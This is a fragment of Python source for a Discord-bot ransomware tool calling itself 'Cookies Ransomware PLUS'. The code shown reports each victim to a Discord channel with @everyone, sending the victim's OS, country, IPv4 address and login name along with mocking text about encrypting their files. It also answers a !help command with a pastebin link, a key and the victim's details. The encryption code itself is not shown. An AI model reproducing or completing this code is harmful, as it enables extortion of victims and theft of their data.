...
token = 'DISCORD_TOKEN_HERE' #DISCORD_TOKEN_HERE
global appdata
...
async def on_ready():
    ...
    value1 = f"@everyone ✅ **{channel_name}** | {platform.system()} {platform.release()} | :flag_{flag.lower()} | **IPv4** ||{ip}||: \n> Some dumbass named **`{os.getlogin()}`** ran Cookies Ransomware PLUS tool start encrypting there files!"
    if is_admin == True:
...
async def on_message(message):
    if message.channel.name != channel_name:
        ...
        if message.content == "!help":
            import os
            await message.channel.send(f"https://pastebin.com/GaJbwS3Y **Key for pastebin is** ```3xcst-ZbtU$AMMz8rWbDk3&e```\n USER **`{os.getlogin()}`** Digits are ```{digits}```")
